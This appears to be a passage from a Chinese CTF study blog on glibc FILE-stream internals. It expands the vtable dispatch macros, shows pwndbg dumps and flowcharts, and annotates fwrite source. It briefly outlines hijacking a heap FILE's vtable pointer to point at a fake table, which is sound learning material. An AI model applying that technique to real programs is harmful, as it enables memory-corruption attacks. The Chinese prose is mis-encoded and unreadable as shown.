<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœå±•å¼€è¿™ä¸ªå®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_IO_XSGETN(FP, DATA, N) </span><br><span class="line">= JUMP2 (__xsgetn, FP, DATA, N)</span><br><span class="line">= (_IO_JUMPS_FUNC(FP)-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (_IO_JUMPS_FILE_plus (FP))-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (_IO_CAST_FIELD_ACCESS ((FP), struct _IO_FILE_plus, vtable))-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (FP-&gt;vtable)[__xsgetn] ) (FP, DATA, N)</span><br><span class="line"></span><br><span class="line">IO_validate_vtableæ¥å—ä¸€ä¸ªvtableæŒ‡é’ˆ,åŸå°ä¸åŠ¨åœ°è¿”å›,åªå¯¹è¿™ä¸ªvtableåšä¸€äº›æ ¡éªŒ</span><br><span class="line">=(FP-&gt;vtable)[__xsgetn](FP, DATA, N)</span><br><span class="line"></span><br><span class="line">__xsgetnå¯ä»¥ç†è§£ä¸ºåç§»é‡æˆ–è€…æšä¸¾å€¼</span><br><span class="line">fpçš„vtableè¡¨ä¸­åç§»é‡ä¸º__xsgetnå¤„å°±æ˜¯_IO_file_xsgetn</span><br><span class="line">=_IO_file_xsgetn (FP, DATA, N)</span><br></pre></td></tr></table></figure>





<blockquote>
<p>è¿˜æœ‰ä¸€ç§æ€è·¯æ˜¯ä¿æŒçœŸè¡¨ä¸å˜,ä½†æ˜¯ç¯¡æ”¹çœŸè¡¨ä¸Šçš„å‡½æ•°æŒ‡é’ˆ</p>
<p>ä½†æ˜¯å‰ææ˜¯çœŸè¡¨æ‰€åœ¨çš„å†…å­˜åŒºå—å¯å†™</p>
<p>ç„¶è€Œäº‹å®ä¸Šä¸å¯å†™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all.vtable</span><br><span class="line">$5 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">pwndbg&gt; info target</span><br><span class="line">	...</span><br><span class="line">	0x00007ffff7dcd900 - 0x00007ffff7dd0ba0 is .data.rel.ro in /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">	...</span><br><span class="line">pwndbg&gt; lm</span><br><span class="line">	...</span><br><span class="line"> 0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>åªå¯è¯»</p>
<p>å› æ­¤åªèƒ½è€ƒè™‘å½“<code>_IO_list_all</code>ä½äºå †åŒºæ—¶,ä¿®æ”¹å…¶vtableæŒ‡é’ˆæŒ‡å‘å‡è¡¨</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$25 = (struct _IO_FILE_plus *) 0x602010</span><br><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$26 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x6020f0,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x602100,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x/30gx file</span><br><span class="line">0x602010:       0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602070:       0x0000000000000000      0x00007ffff7dd2540</span><br><span class="line">0x602080:       0x0000000000000003      0x0000000000000000</span><br><span class="line">0x602090:       0x0000000000000000      0x00000000006020f0</span><br><span class="line">0x6020a0:       0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x6020b0:       0x0000000000602100      0x0000000000000000</span><br><span class="line">0x6020c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020d0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020e0:       0x0000000000000000      0x00007ffff7dd06e0	//æ­¤å¤„ä¸ºvtableæŒ‡é’ˆ</span><br><span class="line">0x6020f0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; lm</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x602000           0x623000 rw-p    21000 0      [heap]</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">subgraph stack[&quot;stack&quot;]</span><br><span class="line"></span><br><span class="line">	subgraph main [&quot;main frame&quot;]</span><br><span class="line">		filepointer[&quot;FILE* file&quot;]</span><br><span class="line">		style filepointer fill:RED</span><br><span class="line">	end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">subgraph glibcdata [&quot;glibc memory&quot;]</span><br><span class="line">	subgraph table [&quot;_IO_file_jumps&quot;]</span><br><span class="line">			__xsputn[&quot;__xsputn&quot;]</span><br><span class="line">			__xsgetn[&quot;__xsgetn&quot;]</span><br><span class="line">			etc[&quot;...&quot;]</span><br><span class="line">			style __xsputn fill:RED</span><br><span class="line">			style __xsgetn fill:RED</span><br><span class="line">			style etc fill:RED</span><br><span class="line">	end</span><br><span class="line">	style table fill:GREEN</span><br><span class="line">	</span><br><span class="line">	xsputn[&quot;_IO_new_file_xsputn&quot;]</span><br><span class="line">  	xsgetn[&quot;__GI__IO_file_xsgetn&quot;]</span><br><span class="line">  	style xsputn fill:YELLOW</span><br><span class="line">  	style xsgetn fill:YELLOW</span><br><span class="line">  	</span><br><span class="line">  	subgraph plus1[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stderr[&quot;struct FILE stderr&quot;]</span><br><span class="line">  		vtable1[&quot;vtable&quot;]</span><br><span class="line">  		</span><br><span class="line">  	end</span><br><span class="line">  	  subgraph plus2[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stdout[&quot;struct FILE stdout&quot;]</span><br><span class="line">  		vtable2[&quot;vtable&quot;]</span><br><span class="line">  	end</span><br><span class="line">  	  subgraph plus3[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stdin[&quot;struct FILE stdin&quot;]</span><br><span class="line">  		vtable3[&quot;vtable&quot;]</span><br><span class="line">  	end</span><br><span class="line">  	</span><br><span class="line">  	listhead[&quot;_IO_list_all&quot;]</span><br><span class="line">  	style listhead fill:RED</span><br><span class="line">  	</span><br><span class="line">  	</span><br><span class="line">  	</span><br><span class="line">  	style vtable1 fill:RED</span><br><span class="line">  	style vtable2 fill:RED</span><br><span class="line">  	style vtable3 fill:RED</span><br><span class="line">  	style stderr fill:GREEN</span><br><span class="line">	style stdout fill:GREEN</span><br><span class="line">	style stdin fill:GREEN</span><br><span class="line">	style plus1 fill:GREEN</span><br><span class="line">	style plus2 fill:GREEN</span><br><span class="line">	style plus3 fill:GREEN</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">subgraph heap [&quot;heap&quot;]</span><br><span class="line">	subgraph plus [&quot;_IO_FILE_plus&quot;]</span><br><span class="line">		file[&quot;struct FILE file&quot;]</span><br><span class="line">		vtable[&quot;vtable&quot;]	</span><br><span class="line">		style file fill:GREEN</span><br><span class="line">		style vtable fill:RED</span><br><span class="line">	end	</span><br><span class="line">	style plus fill:GREEN</span><br><span class="line">	</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filepointer--&gt;file</span><br><span class="line">vtable----&gt;table</span><br><span class="line"></span><br><span class="line">file--chain--&gt;stderr--chain--&gt;stdout--chain--&gt;stdin--chain--&gt;null</span><br><span class="line">  	__xsputn--&gt;xsputn</span><br><span class="line">  	__xsgetn--&gt;xsgetn</span><br><span class="line">listhead--&gt;plus1</span><br><span class="line">  </span><br><span class="line">subgraph example [&quot;å›¾ä¾‹&quot;]</span><br><span class="line">	function[&quot;å‡½æ•°&quot;]</span><br><span class="line">	style function fill:YELLOW</span><br><span class="line">	struct[&quot;å¯¹è±¡&quot;]</span><br><span class="line">	style struct fill:GREEN</span><br><span class="line">	pointer[&quot;æŒ‡é’ˆ&quot;]</span><br><span class="line">	style pointer fill:RED</span><br><span class="line">end</span><br><span class="line">style example fill:GRAY</span><br></pre></td></tr></table></figure>

<p><strong>ç»¼ä¸Š,fopençš„ä½œç”¨æ˜¯,åˆ›å»ºä¸€ä¸ªæ–°çš„<code>_IO_FILE_plus</code>ç»“æ„ä½“(åŒ…æ‹¬FILEå’Œvtableä¸¤éƒ¨åˆ†)å¹¶åˆå§‹åŒ–ä¹‹,ç„¶åå¤´æ’æ³•å°†å…¶é“¾æ¥åˆ°<code>_IO_list_all</code>é“¾è¡¨ä¸Š</strong></p>
<h3 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br></pre></td></tr></table></figure>

<p>æŠŠ <strong>ptr</strong> æ‰€æŒ‡å‘çš„æ•°ç»„ä¸­çš„æ•°æ®å†™å…¥åˆ°ç»™å®šæµ <strong>stream</strong> ä¸­ã€‚</p>
<p>å†™å…¥<code>size</code>å¤§å°çš„å•ä½<code>nmemb</code>ä¸ª</p>
<p>å®é™…ä¸Šè°ƒç”¨è·³è½¬è¡¨å‡½æ•°<code>vtable.__xsputn</code></p>
<p>æ•´ä¸ªè°ƒç”¨è¿‡ç¨‹é“¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flowchart TB</span><br><span class="line">fwrite[fwrite]</span><br><span class="line">_IO_fwrite[_IO_fwrite @ glibc-2.38/libio/iofwrite.c:32]</span><br><span class="line">_IO_file_xsputn[_IO_new_file_xsputn @ glibc-2.38/libio/fileops.c:1197]</span><br><span class="line">_IO_file_overflow[</span><br><span class="line">	_IO_new_file_overflow @ glibc-2.38/libio/fileops.c:733</span><br><span class="line">	ä¹Ÿä¼šè°ƒç”¨_IO_do_writeå°†ç°æœ‰çš„ç¼“å†²åŒºå†™å…¥æ–‡ä»¶</span><br><span class="line">	ç„¶åç¼“å†²åŒºæŒ‡é’ˆå¤ä½</span><br><span class="line">]</span><br><span class="line">_IO_do_write[_IO_new_do_write @ glibc-2.38/libio/fileops.c:425]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_do_write[</span><br><span class="line">	new_do_write @ glibc-2.38/libio/fileops.c:431</span><br><span class="line">	readç¼“å†²åŒºä¸‰ä¸ªæŒ‡é’ˆå…¨ç­‰äº_IO_buf_base</span><br><span class="line">	writeç¼“å†²åŒºbaseå’ŒptræŒ‡å‘_IO_buf_base, endæŒ‡é’ˆæŒ‡å‘</span><br><span class="line">]</span><br><span class="line">write[&quot;__write(f-&gt;_fileno,data,to_do)&quot;]</span><br><span class="line"></span><br><span class="line">_IO_file_write[_IO_new_file_write @ glibc-2.38/libio/fileops.c:1173]</span><br><span class="line"></span><br><span class="line">fwrite--&quot;_IO_sputn&quot;--&gt;_IO_fwrite</span><br><span class="line">_IO_fwrite--&gt;_IO_file_xsputn</span><br><span class="line">_IO_file_xsputn--&quot;_IO_OVERFLOW&quot;--&gt;_IO_file_overflow</span><br><span class="line">_IO_file_xsputn--&gt;_IO_do_write</span><br><span class="line">_IO_do_write--&gt;new_do_write</span><br><span class="line">new_do_write--&quot;_IO_SYSWRITE&quot;--&gt;_IO_file_write</span><br><span class="line">_IO_file_write--&gt;write</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>









<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)<span class="comment">//ä¸€ä¸ªå•ä½sizeå­—èŠ‚,ä½†æ˜¯å®é™…ä¸Šè¿˜æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);		<span class="comment">//checkä¸ªå¯‚å¯</span></span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);		<span class="comment">//å®é™…ä¸Šè°ƒç”¨_IO_new_file_xsputn</span></span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)		<span class="comment">//è¿”å›å®é™…å†™å…¥å•ä½æ•°,æ³¨æ„ä¸æ˜¯å­—èŠ‚æ•°</span></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;		<span class="comment">//æ•°æ®æŒ‡é’ˆ</span></span><br><span class="line">  <span class="type">size_t</span> to_do = n;		<span class="comment">//å½“å‰è¿˜å·®å¤šå°‘ä¸ªæ²¡æœ‰å†™å…¥</span></span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;	<span class="comment">//è¡Œç¼“å†²å¼ºåˆ¶åˆ·æ–°ç¼“å†²åŒºæ ‡å¿—</span></span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;		<span class="comment">//å½“å‰ç¼“å†²åŒºå‰©ä½™ç©ºé—´</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line">  	<span class="comment">//å¦‚æœè¦å†™å…¥çš„å¤§å°å¤§äºä¸€ä¸ªå—æˆ–è€…filebufæ²¡æœ‰ç¼“å†²åŒº,é‚£ä¹ˆç›´æ¥ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment">//å¦‚æœä½¿ç”¨è¡Œç¼“å†² å¹¶ä¸” è¯¥fæ–‡ä»¶æµç›®å‰æ­£åœ¨è¿›è¡Œå†™å…¥æ“ä½œ</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;<span class="comment">//countè¡¨ç¤ºå½“å‰å†™ç¼“å†²åŒºå‰©ä½™ç©ºé—´</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)			<span class="comment">//å¦‚æœå‰©ä½™ç©ºé—´è¶³å¤Ÿå¤§åˆ™ç›´æ¥å†™å…¥</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )<span class="comment">//å¯»æ‰¾æœ€åä¸€ä¸ª\n,æ³¨æ„æ­¤æ—¶å¹¶æœªå‘ç¼“å†²åŒºè¿›è¡Œæ‹·è´,åªæ˜¯å¯»æ‰¾\n</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)		<span class="comment">//å¦‚æœå‘ç°æœ‰æ¢è¡Œç¬¦åˆ™must_flushç½®1è¡¨ç¤ºå¿…é¡»åˆ·æ–°ç¼“å†²åŒº</span></span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¦åˆ™å¦‚æœå†™ç¼“å†²åŒºä¸­è¿˜æœ‰ç©ºé—´,é¦–å…ˆè®¡ç®—ä¸€ä¸‹å‰©ä½™ç©ºé—´count</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)			<span class="comment">//å¦‚æœå‰©ä½™å†™ç¼“å†²åŒºå¤Ÿå¤§ç›´æ¥æ”¾åˆ°å†™ç¼“å†²åŒº</span></span><br><span class="line">	count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);	<span class="comment">//ç›´æ¥ä»dataæ¬åˆ°write_bufä¸­</span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;<span class="comment">//to_doé™ä¸º0è¡¨æ˜å·²ç»å†™å…¥writebufäº†</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åˆ°æ­¤å·²ç»è§£å†³äº†å†™å…¥æ¯”è¾ƒå°‘çš„æƒ…å†µ,èƒ½å¤Ÿç›´æ¥æ”¾åˆ°write_bufä¸­</span></span><br><span class="line">    <span class="comment">//ä¸‹é¢è¿˜è¦è€ƒè™‘çš„ä¸šåŠ¡æœ‰:</span></span><br><span class="line">    <span class="comment">//1.è¡Œç¼“å†²æ˜¯å¦æœ‰\nç»“å°¾,ä¹Ÿå°±æ˜¯è¯´must_flushæ˜¯å¦ç½®ä½, 